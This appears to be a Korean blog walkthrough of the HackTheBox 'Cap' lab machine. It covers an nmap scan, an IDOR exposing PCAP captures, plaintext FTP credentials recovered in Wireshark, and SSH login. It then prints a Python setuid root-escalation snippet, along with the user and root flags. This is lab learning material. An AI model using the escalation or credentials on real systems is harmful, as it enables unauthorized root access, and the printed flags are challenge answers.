---
title: "Cap"
date: 2026-03-18T22:02:51+09:00
draft: false
categories: ["htb"]        # htb / portswigger / ctf / research
series: ["HTB Machine"]               # 단계별 묶음 (Ex. "PortSwigger SQLi Labs", "HTB Starting Point")
difficulty: "Easy"         # Easy / Medium / Hard / Insane
tags: ["Web enumeration", "Packet capture analysis"]
thumbnail: "1.png"              # /images/thumbnails/파일명.png
ctf_name: "HackTheBox"
points: 0
solves: 88340
flag: ""
---

## Overview
Cap은 HTTP 서버를 실행하는 난이도가 쉬운 Linux 시스템으로, 네트워크 캡처를 포함한 관리 기능을 수행합니다. 보안 제어가 제대로 이루어지지 않으면 IDOR(Insecure Direct Object Reference) 취약점을 통해 다른 사용자의 캡처 파일에 접근할 수 있게 됩니다. 캡처 파일에는 평문으로 된 자격 증명이 포함되어 있으며, 이를 이용해 시스템에 대한 접근 권한을 획득할 수 있습니다. 이후 Linux 시스템의 취약점을 악용하여 루트 권한으로 상승할 수 있습니다.

### Nmap 포트 스캔 (정찰)
┌──(d4rkscare㉿kr0pt)-[/mnt/c/Users/gohun/Desktop]
└─$ sudo nmap -sV 10.129.5.103
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 15:52 KST
Nmap scan report for 10.129.5.103
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
### 기능 파악
![페이지 1](2.png)
![페이지 2](3.png)
![페이지 3](4.png)
![페이지 4](5.png)

!!중요!!
Dash board /data/0에서 PCAP 파일 다운로드 가능

1. DashBoard, ipconfig 내용(/data), Pcap 내용 (각종 디렉토리 경로 파악 가능)

##$ Analysis
현재로 알 수 있는 건 Gunicorn과 각 버전 노출로 인한 ftp, ssh, 겉핡기 식의 서버 내부 상황
OR WIRESHARK로 인한 패킷 분석

## 1. 예상 공격 체인

```
FTP Anonymous -> Gunicorn version find & exploit
-> ssh -> 권한 상승 -> FLAG
```

## 2. 각종 시도 후 결과
이 페이지에서는 웹 해킹이 의미가 있는지 생각이 났으며
기능 부분 중 PCAP 파일을 받아 FTP 혹은 SSH 접속 가능한 힌트가 있는지 확인해 보았습니다.
![PCAP](7.png)
PCAP 파일 다운로드
![WireShark](6.png)
WireSark를 통해 확인 결과 
HTTP, TCP, FTP 등 프로토콜 확인 가능
![Pass](8.png)
```
USER:nathan Pass: Buck3tH4TF0RM3!
```
이 계정을 통해 FTP, SSH 접속 시도결과 
SSH 접속 성공
![SSH](9.png)

## USER FLAG
``` 
USER_FLAG: 540f8558de7646a7e0784f3d62c5b6f2
```
### Exploitation
권한 상승으로 기본적인 것 부터 시도합니다.
python version 3.8을 사용하는 것을 확인하였습니다.
![privilleage](10.png)

```
Source Code:
import os
os.setuid(0)
os.system("/bin/bash")
```
## ROOT Flag

```
ROOT FLAG{5bfce0b6e9760336e664cfc001b2d688}
```

### 느낀점
이번 서버는 Easy인 만큼 웹 해킹이 필요없고 권한 상승 스킬도 필요없는 서버였지만 다시한번 와이어 샤크를 사용해본 경험을 하게 되었습니다.